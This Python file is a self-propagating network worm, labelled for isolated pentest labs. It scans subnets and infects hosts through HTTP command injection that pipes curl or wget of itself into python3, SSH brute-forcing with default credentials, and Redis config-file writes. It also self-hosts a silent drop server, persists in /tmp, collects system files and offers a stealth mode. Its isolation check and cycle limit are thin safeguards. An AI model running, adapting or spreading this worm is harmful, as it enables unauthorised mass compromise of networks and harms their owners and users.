#!/usr/bin/env python3
"""
Universal Network Worm v3.1 - FULLY DYNAMIC SELF-PROPAGATING
AUTHORIZED PENTEST USE ONLY - ISOLATED LAB ENVIRONMENT
"""
 
import socket
import subprocess
import threading
import time
import random
import os
import sys
import json
import base64
import requests
from concurrent.futures import ThreadPoolExecutor
from itertools import cycle
import urllib.parse
import ssl
import http.server
import socketserver

class UniversalWorm:
    def __init__(self):
        self.hostname = socket.gethostname()
        self.interfaces = self.get_all_interfaces()
        self.self_ip = self.get_self_ip()
        self.self_url = f"http://{self.self_ip}:8080/worm.py"
        self.subnets = self.discover_subnets()
        self.common_ports = [22, 80, 443, 8080, 8443, 3000, 5000, 9000, 8888, 3306, 5432, 6379]
        self.exploit_modules = {}
        self.infected = set()
        self.c2_urls = self.get_fallback_c2()
        self.stagnant_cycles = 0
        self.max_cycles = 10  # Safety limit
        self.cycle_count = 0
        
        # Load exploit modules AFTER methods are defined
        self.load_exploit_modules()
        
        # Self-host immediately
        threading.Thread(target=self.start_drop_server, daemon=True).start()
        print(f"[*] 🪱 DYNAMIC WORM v3.1 → {self.hostname} → SELF_IP={self.self_ip}", flush=True)

    def get_self_ip(self):
        """🚀 Dynamic self-discovery - works EVERYWHERE"""
        methods = [
            lambda: socket.gethostbyname(socket.gethostname()),
            lambda: self.get_route_ip(),
            lambda: self.get_external_ip(),
            lambda: "127.0.0.1"  # Failsafe
        ]
        for method in methods:
            try:
                ip = method()
                if ip != "127.0.0.1" and not ip.startswith("169.254"):  # Skip link-local
                    return ip
            except:
                continue
        return "127.0.0.1"

    def get_route_ip(self):
        """Get IP via route lookup"""
        try:
            result = subprocess.run(['ip', 'route', 'get', '1'], capture_output=True, text=True)
            return result.stdout.split()[6] if result.stdout.split() else "127.0.0.1"
        except:
            return "127.0.0.1"

    def get_external_ip(self):
        """Stupid simple - works on most networks"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return None

    def start_drop_server(self):
        """🎯 Auto-start HTTP server hosting self on port 8080"""
        try:
            # Copy self to /tmp for serving
            tmp_path = "/tmp/worm.py"
            with open(__file__, 'r') as f:
                content = f.read()
            with open(tmp_path, 'w') as f:
                f.write(content)
            os.chmod(tmp_path, 0o755)
            
            # Create simple HTTP handler to serve worm.py
            class WormHandler(http.server.SimpleHTTPRequestHandler):
                def __init__(self, *args, **kwargs):
                    super().__init__(*args, directory="/tmp", **kwargs)
                
                def log_message(self, format, *args):
                    pass  # Silent - no logging
            
            # Start server on 0.0.0.0:8080
            with socketserver.TCPServer(("0.0.0.0", 8080), WormHandler) as httpd:
                print(f"[*] 🎯 Drop server running at {self.self_url}", flush=True)
                httpd.serve_forever()
                
        except Exception as e:
            print(f"[!] Drop server failed: {e}", flush=True)

    def get_all_interfaces(self):
        """Enumerate all network interfaces"""
        interfaces = []
        try:
            result = subprocess.run(['ip', 'addr'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'inet ' in line and not '127.0.0.1' in line:
                    ip = line.split()[1].split('/')[0]
                    interfaces.append(ip)
        except:
            pass
        return interfaces if interfaces else ["127.0.0.1"]

    def discover_subnets(self):
        """Auto-discover subnets from interface IPs"""
        subnets = []
        for ip in self.interfaces:
            parts = ip.split('.')
            if len(parts) == 4:
                subnet = '.'.join(parts[:3]) + '.'
                subnets.append(subnet)
                # Also check adjacent common Docker subnets
                if '172.' in ip:
                    subnets.extend(['172.16.0.', '172.17.0.', '172.18.0.', '172.19.0.', '172.20.0.', '172.21.0.', '172.22.0.'])
                elif '192.168.' in ip:
                    subnets.extend(['192.168.0.', '192.168.1.', '192.168.2.'])
                
        return list(set(subnets))

    def get_fallback_c2(self):
        """Optional external C2 (for exfil only)"""
        return []  # Empty = pure peer-to-peer

    def load_exploit_modules(self):
        """Dynamic exploit loading - NOW methods exist"""
        self.exploit_modules = {
            22: self.ssh_bruteforce,
            80: self.http_rce,
            443: self.http_rce,
            8080: self.http_rce,
            3000: self.http_rce,
            5000: self.http_rce,
            3306: self.mysql_exploit,
            5432: self.pg_exploit,
            6379: self.redis_exploit
        }

    def generate_hosts(self):
        """Generate target IPs from discovered subnets"""
        hosts = []
        for subnet in self.subnets:
            for i in range(1, 255):
                hosts.append(f"{subnet}{i}")
        # Add service names that resolve in Docker
        hosts.extend([
            "webserver", "victim", "api", "db", "fileshare", "dns",
            "localhost", "127.0.0.1", "gateway"
        ])
        return list(set(hosts))  # Deduplicate

    def scan_port(self, host, port):
        """Quick TCP port scan"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except:
            return False

    def mass_scan(self, hosts):
        """Parallel port scanning"""
        open_hosts = {}
        with ThreadPoolExecutor(max_workers=50) as executor:  # Reduced for safety
            futures = {
                executor.submit(self.scan_services, host): host 
                for host in random.sample(hosts, min(100, len(hosts)))  # Scan subset
            }
            for future in futures:
                host = futures[future]
                try:
                    services = future.result(timeout=10)
                    if services:
                        open_hosts[host] = services
                except:
                    pass
        return open_hosts

    def scan_services(self, host):
        """Scan common services on host"""
        services = {}
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(self.scan_port, host, port): port 
                      for port in self.common_ports}
            for future in futures:
                port = futures[future]
                if future.result():
                    services[port] = True
        return services if services else None

    # === DYNAMIC SELF-PROPAGATING EXPLOITS ===

    def http_rce(self, host, port=80):
        """🔥 SELF-PROPAGATING HTTP RCE - uses victim's OWN IP!"""
        target_url = f"http://{host}:{port}"
        # Multiple payload strategies for different vulnerable endpoints
        payloads = [
            # Command injection via query params
            f"{target_url}/exec?cmd=python3%20-c%20%22import%20urllib.request;exec(urllib.request.urlopen(%27{self.self_url}%27).read())%22",
            f"{target_url}/ping?ip=;curl%20{self.self_url}|python3",
            # Alternative wget approach
            f"{target_url}/?q=;wget%20-qO-%20{self.self_url}|python3",
        ]
        
        for payload in payloads:
            try:
                r = requests.get(payload, timeout=5, verify=False)
                if r.status_code == 200:
                    print(f"[+] HTTP→{host}:{port} payload delivered", flush=True)
                    self.infected.add(host)
                    return True
            except:
                continue
        return False

    def ssh_bruteforce(self, host, port=22):
        """SSH propagation using self-hosted payload - simulation only"""
        # NOTE: This requires sshpass which may not be available
        # In Docker lab, primarily rely on HTTP RCE
        creds = [
            ('root', 'root'), ('admin', 'admin'), 
            ('ubuntu', 'ubuntu'), ('user', 'user')
        ]
        
        # Create payload that downloads and executes worm
        payload = f"curl -s {self.self_url} | python3 &"
        
        for user, pwd in creds:
            try:
                # Try sshpass if available, otherwise skip
                result = subprocess.run(
                    ['sshpass', '-p', pwd, 'ssh', '-o', 'StrictHostKeyChecking=no',
                     '-o', 'ConnectTimeout=3', f'{user}@{host}', payload],
                    timeout=5, capture_output=True
                )
                if result.returncode == 0:
                    print(f"[+] SSH→{host}:{user}", flush=True)
                    self.infected.add(host)
                    return True
            except FileNotFoundError:
                # sshpass not installed - skip SSH exploits
                return False
            except:
                continue
        return False

    def mysql_exploit(self, host):
        """MySQL UDF + self-propagation - simulation"""
        # MySQL exploit requires mysql client - often not available
        # Return False for now, rely on HTTP exploits
        return False

    def pg_exploit(self, host):
        """PostgreSQL exploits - simulation"""
        return False

    def redis_exploit(self, host):
        """Redis RCE → write self-hosted worm"""
        try:
            sock = socket.socket()
            sock.settimeout(3)
            sock.connect((host, 6379))
            # Redis config set dir + dbfilename for RCE
            commands = [
                b"*2\r\n$4\r\nCONFIG\r\n$3\r\nGET\r\n$3\r\ndir\r\n",
                b"*3\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$5\r\n/tmp\r\n",
                b"*3\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$7\r\nworm.sh\r\n",
                f"*3\r\n$3\r\nSET\r\n$1\r\nx\r\n$50\r\ncurl {self.self_url} | python3 &\r\n".encode(),
                b"*1\r\n$4\r\nSAVE\r\n"
            ]
            for cmd in commands:
                sock.send(cmd)
                time.sleep(0.1)
            sock.close()
            print(f"[+] Redis→{host}", flush=True)
            self.infected.add(host)
            return True
        except:
            return False

    def infect_host(self, host, services):
        """Main infection routine"""
        if host in self.infected:
            return
        print(f"[>] 🦠 Infecting {host} → ports {list(services.keys())}", flush=True)
        
        with ThreadPoolExecutor(max_workers=3) as executor:
            futures = []
            for port in services:
                if port in self.exploit_modules:
                    futures.append(
                        executor.submit(self.exploit_modules[port], host, port)
                    )
            
            for future in futures:
                try:
                    future.result(timeout=15)
                except:
                    pass

    def persistence(self):
        """Multi-vector persistence within container"""
        paths = ["/tmp/worm.py", "/var/tmp/worm.py"]
        for path in paths:
            try:
                os.makedirs(os.path.dirname(path), exist_ok=True)
                with open(__file__, 'r') as f:
                    content = f.read()
                with open(path, 'w') as f:
                    f.write(content)
                os.chmod(path, 0o755)
                print(f"[+] ✅ Persisted to {path}", flush=True)
                break
            except:
                continue

    def verify_isolation(self):
        """Ensure we're in isolated network (no internet)"""
        try:
            socket.create_connection(("8.8.8.8", 53), timeout=2)
            print("[!] ⚠️ WARNING: Internet access detected! Aborting for safety.")
            return False
        except:
            print("[*] ✓ Network isolated - proceeding")
            return True

    def exfiltrate(self, host):
        """Collect system info for demo purposes"""
        interesting = ["/etc/hostname", "/proc/version", "/etc/os-release"]
        loot_data = {}
        for file in interesting:
            try:
                with open(file, 'r') as f:
                    loot_data[file] = f.read()[:200]
            except:
                pass
        
        if loot_data:
            print(f"[📊] System info from {host}: {json.dumps(loot_data, indent=2)}", flush=True)

    def main(self):
        """Main worm execution with safety limits"""
        print(f"[*] 🌐 DEPLOYMENT → SELF_IP={self.self_ip} → {len(self.subnets)} subnets", flush=True)
        
        # Safety check 1: Verify network isolation
        if not self.verify_isolation():
            print("[!] Aborting: Not in isolated environment")
            return
        
        # Safety check 2: Parse priority targets from command line
        priority_targets = sys.argv[1:] if len(sys.argv) > 1 else []
        if priority_targets:
            print(f"[*] Priority targets: {priority_targets}")
        
        # Phase 1: Persist + Self-host
        self.persistence()
        time.sleep(2)  # Let drop server start
        
        # Phase 2: Generate targets
        hosts = self.generate_hosts()
        if priority_targets:
            hosts = priority_targets + [h for h in hosts if h not in priority_targets]
        
        print(f"[*] 🔍 Scanning {len(hosts)} hosts (max {self.max_cycles} cycles)...", flush=True)
        
        # Phase 3: Infection loop with termination condition
        while self.cycle_count < self.max_cycles:
            self.cycle_count += 1
            print(f"\n[*] === CYCLE {self.cycle_count}/{self.max_cycles} ===", flush=True)
            
            open_hosts = self.mass_scan(hosts)
            print(f"[+] 🎯 {len(open_hosts)} hosts with open ports", flush=True)
            
            # Infect new hosts
            new_infections = 0
            for host, services in open_hosts.items():
                if host not in self.infected:
                    threading.Thread(
                        target=self.infect_host, 
                        args=(host, services), 
                        daemon=True
                    ).start()
                    new_infections += 1
            
            if new_infections > 0:
                print(f"[+] {new_infections} new infection attempts", flush=True)
                self.stagnant_cycles = 0
            else:
                self.stagnant_cycles += 1
                print(f"[!] No new infections (stagnant: {self.stagnant_cycles})", flush=True)
            
            # Termination condition: 3 stagnant cycles
            if self.stagnant_cycles >= 3:
                print("[*] No progress for 3 cycles. Network saturated. Stopping.")
                break
            
            # Exfiltrate from infected hosts
            for host in list(self.infected):
                self.exfiltrate(host)
            
            time.sleep(10)  # Delay between cycles
        
        print(f"\n[*] === WORM COMPLETE ===")
        print(f"[*] Cycles: {self.cycle_count}")
        print(f"[*] Total infected: {len(self.infected)}")
        print(f"[*] Infected hosts: {list(self.infected)}")

def silent_run():
    """Stealth mode - suppress output"""
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = sys.stdout
    UniversalWorm().main()

if __name__ == '__main__':
    if len(sys.argv) > 1 and sys.argv[1] == 'silent':
        silent_run()
    else:
        UniversalWorm().main()

